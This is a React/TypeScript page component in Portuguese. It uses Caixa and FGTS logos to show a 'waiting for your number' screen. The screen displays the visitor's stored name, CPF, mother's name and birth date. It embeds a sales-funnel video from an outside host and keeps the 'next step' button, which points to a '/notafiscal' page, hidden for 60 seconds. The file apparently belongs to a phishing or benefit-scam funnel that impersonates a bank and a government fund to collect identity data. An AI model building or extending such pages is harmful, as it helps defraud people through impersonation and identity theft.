/* eslint-disable @typescript-eslint/no-explicit-any */
import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import flogo from "../assets/f-logo.png";
import logofgts from "../assets/fgts2.png";
import { FaAngleRight, FaSpinner } from "react-icons/fa";
import { Helmet } from "react-helmet";
import { UserData } from "../types/userData";
import dayjs from "dayjs";

// Definição para evitar erro de tipagem com `smartplayer`
declare global {
    interface Window {
        smartplayer: any;
    }
}

// Página de espera com VSL e progressão dinâmica
export function AguardarSenha() {
    const [isVisible, setIsVisible] = useState(false);

    useEffect(() => {
        const SECONDS_TO_DISPLAY = 60;

        let attempts = 0;
        let elsDisplayed = false;
        const alreadyDisplayedKey = `alreadyElsDisplayed${SECONDS_TO_DISPLAY}`;
        const alreadyElsDisplayed = localStorage.getItem(alreadyDisplayedKey);

        const showHiddenElements = () => {
            elsDisplayed = true;
            setIsVisible(true);
            localStorage.setItem(alreadyDisplayedKey, "true");
        };

        const startWatchVideoProgress = () => {
            if (
                typeof window.smartplayer === "undefined" ||
                !(window.smartplayer.instances && window.smartplayer.instances.length)
            ) {
                if (attempts >= 10) return;
                attempts += 1;
                setTimeout(() => startWatchVideoProgress(), 1000);
                return;
            }

            window.smartplayer.instances[0].on("timeupdate", () => {
                if (elsDisplayed || window.smartplayer.instances[0].smartAutoPlay) return;
                if (window.smartplayer.instances[0].video.currentTime < SECONDS_TO_DISPLAY) return;
                showHiddenElements();
            });
        };

        if (alreadyElsDisplayed === "true") {
            setTimeout(() => showHiddenElements(), 100);
        } else {
            startWatchVideoProgress();
        }
    }, []);

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        cep: "",
        nomeMae: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: ""
    });

    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    return (
        <div className="w-screen h-screen flex flex-col items-center text-white bg-[#025bab]">
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">
                            Olá, {userData?.nome.split(" ")[0]}
                        </span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>
            </header>

            <div className="rounded-lg bg-primary text-white mt-2">
                <div className="rounded-lg space-y-10">
                    <div className="flex items-lef space-x-2">
                        <div className="bg-orange-400 p-2 rounded-full w-fit">
                            <img src={flogo} alt="flogo" width={20} />
                        </div>
                        <h2 className="font-bold text-2xl">Aguardando senha...</h2>
                    </div>

                    <div className="font-bold text-xl flex flex-col px-4 space-y-2">
                        <div className="flex items-center justify-between">
                            <h3>{userData.nome.toUpperCase()}</h3>
                            <FaAngleRight />
                        </div>
                        {userData?.nomeMae && (
                            <span className="font-thin text-zinc-300">Nome da mãe: {userData?.nomeMae}</span>
                        )}
                        <span className="font-thin text-zinc-300">CPF: {userData?.cpf}</span>
                        <span className="font-thin text-zinc-300">
                            Nascimento: {dayjs(userData?.dataNascimento).format("DD/MM/YYYY")}
                        </span>
                    </div>
                    <span className="border-b border-b-zinc-800 my-2" />
                </div>
            </div>

            <div className="w-full p-4">
                <div
                    dangerouslySetInnerHTML={{
                        __html:
                            '<div id="vid_6728473a288cac000bd25403" style="position:relative;width:100%;padding: 56.25% 0 0;"> <img id="thumb_6728473a288cac000bd25403" src="https://images.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/6728473a288cac000bd25403/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"> <div id="backdrop_6728473a288cac000bd25403" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div> </div>'
                    }}
                />
                <Helmet>
                    <script
                        type="text/javascript"
                        id="scr_6728473a288cac000bd25403"
                    >
                        {`var s=document.createElement("script"); s.src="https://scripts.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/6728473a288cac000bd25403/player.js", s.async=!0,document.head.appendChild(s);`}
                    </script>
                </Helmet>
            </div>

            <div className="px-3 w-full">
                {isVisible ? (
                    <a href="/notafiscal" className="w-full">
                        <button
                            className="w-full py-3 rounded-md text-white text-xl focus:outline-none bg-orange-500 hover:bg-orange-600 animate-bounce mt-3"
                        >
                            Próxima etapa
                        </button>
                    </a>
                ) : (
                    <button
                        className="w-full py-3 rounded-md text-white text-xl focus:outline-none bg-blue-900 opacity-60"
                        disabled
                    >
                        <div className="flex items-center justify-center space-x-2">
                            <FaSpinner className="animate-spin" />
                            <span>Carregando</span>
                        </div>
                    </button>
                )}
            </div>




            <div className="text-center mt-3 px-4">
                <h2 className="text-lg text-zinc-300">Aguarde sua senha ser chamada...</h2>
                <p className="text-sm text-zinc-400">
                    Estamos preparando seu atendimento. Por favor, aguarde um momento.
                </p>
            </div>
        </div>
    );
}
